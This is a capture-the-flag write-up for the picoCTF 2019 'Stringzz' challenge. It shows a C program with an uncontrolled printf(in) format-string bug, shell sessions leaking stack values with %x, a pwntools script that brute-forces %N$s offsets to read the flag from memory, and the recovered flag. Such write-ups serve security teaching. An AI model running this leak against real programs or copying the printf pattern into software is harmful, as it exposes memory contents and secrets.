# PicoCTF19 Stringzz

## Challenge

Use a format string to pwn this [program](https://2019shell1.picoctf.com/static/f636d94e58ef1e11c1951b986a3c3754/vuln) and get a flag. Its also found in /problems/stringzz_2 on the shell server. [Source](https://2019shell1.picoctf.com/static/f636d94e58ef1e11c1951b986a3c3754/vuln.c).

## Hints

[http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf](http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf)

## Solution

Let's view the directory

```bash
samson@pico-2019-shell1:/problems/stringzz_2$ ls -al
total 92
drwxr-xr-x   2 root       root        4096 Sep 28 21:45 .
drwxr-x--x 684 root       root       69632 Oct 10 18:02 ..
-r--r-----   1 hacksports stringzz_2    31 Sep 28 21:45 flag.txt
-rwxr-sr-x   1 hacksports stringzz_2  7660 Sep 28 21:45 vuln
-rw-rw-r--   1 hacksports hacksports   789 Sep 28 21:45 vuln.c
samson@pico-2019-shell1:/problems/stringzz_2$ cat vuln.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAG_BUFFER 128
#define LINE_BUFFER_SIZE 2000

void printMessage3(char *in) {
  puts("will be printed:\n");
  printf(in);
}
void printMessage2(char *in) {
  puts("your input ");
  printMessage3(in);
}
void printMessage1(char *in) {
  puts("Now ");
  printMessage2(in);
}

int main (int argc, char **argv) {
    puts("input whatever string you want; then it will be printed back:\n");
    int read;
    unsigned int len;
    char *input = NULL;
    getline(&input, &len, stdin);
    //There is no win function, but the flag is wandering in the memory!
    char * buf = malloc(sizeof(char)*FLAG_BUFFER);
    FILE *f = fopen("flag.txt","r");
    fgets(buf,FLAG_BUFFER,f);
    printMessage1(input);
    fflush(stdout);
}
```

After reading the paper recommended from the hints, it looks like we'll be expoiting the `printf()` vulnerability.
Let's determine if this program is vulnerable to the `printf()` vulnerability.

```bash
samson@pico-2019-shell1:/problems/stringzz_2$ ./vuln
input whatever string you want; then it will be printed back:

%x %x %x %x %x
Now 
your input 
will be printed:

a f7d8a36b 565da6f9 f7ef8000 565dbfb4
```

It is vulnerable. Let's try printing 100 items off the stack and grep for the flag.

```bash
samson@pico-2019-shell1:/problems/stringzz_2$  echo $(python -c "print('%x '*100)") | ./vuln
input whatever string you want; then it will be printed back:

Now 
your input 
will be printed:

a f7e1836b 565bf6f9 f7f86000 565c0fb4 ffe72f38 565bf755 56889600 565bf995 f7e1836b 565bf731 f7f86000 565c0fb4 ffe72f58 565bf78e 56889600 565bf993 f7e1681b 565bf76a f7f86000 565c0fb4 ffe72fa8 565bf84d 56889600 80 568897d0 565bf7ae f7f86000 f7f86000 0 ffe73054 f7f863fc 565c0fb4 ffe7305c 12e 56889600 56889740 568897d0 b6b68c00 ffe72fc0 0 0 f7dc9e81 f7f86000 f7f86000 0 f7dc9e81 1 ffe73054 ffe7305c ffe72fe4 1 ffe73054 f7f86000 f7fad75a ffe73050 0 f7f86000 0 0 53fd859e 249e838e 0 0 0 40 f7fc5024 0 0 f7fad869 565c0fb4 1 565bf5b0 0 565bf5e1 565bf797 1 ffe73054 565bf890 565bf8f0 f7fad9b0 ffe7304c f7fc5940 1 ffe747ca 0 ffe747d1 ffe74dbd ffe74df0 ffe74e12 ffe74e1f ffe74e33 ffe74e3f ffe74e79 ffe74e8b ffe74ead ffe74eee ffe74f01 ffe74f17 ffe74f2b 
```

Okay, whatever it is, we'll need to print it as a string. We can't simply use `%s` though. See below:

```bash
samson@pico-2019-shell1:/problems/stringzz_2$ echo $(python -c "print('%s')") | ./vuln
input whatever string you want; then it will be printed back:

Now 
your input 
will be printed:

Segmentation fault (core dumped)
```

This works because `%x` prints values off the stack

The exploit we want to take advantage of is the `Format String Direct Access` explained in this [paper](https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf).

`%4$x` - prints the 4th parameter on the stack in hex, so `%4$s` should print it in ASCII.

```bash
samson@pico-2019-shell1:/problems/stringzz_2$ ./vuln
input whatever string you want; then it will be printed back:

%4$x   
Now 
your input 
will be printed:

f7fa8000
samson@pico-2019-shell1:/problems/stringzz_2$ ./vuln
input whatever string you want; then it will be printed back:

%4$s
Now 
your input 
will be printed:

lM
```

```bash
samson@pico-2019-shell1:/problems/stringzz_2$ python -c "print('%5$s')" | ./vuln

input whatever string you want; then it will be printed back:

Now 
your input 
will be printed:

%5
```

Doesn't seem to work, so let's brute force it:

```python
#!/usr/bin/env python
from __future__ import print_function
from pwn import *

index = 1
while True:
    print("Attempting index: {}".format(index))
    p = process('./vuln', cwd='/problems/stringzz_2')
    p.recvuntil('input whatever string you want; then it will be printed back:')
    p.sendline("%{}$s".format(index))
    res = p.recvall()
    if "picoCTF" in res:
        print("Found flag: {}".format(res))
        break
    index=index+1
```

Amazingly, it returns with an answer.

## Flag

`picoCTF{str1nG_CH3353_166b95b4}`

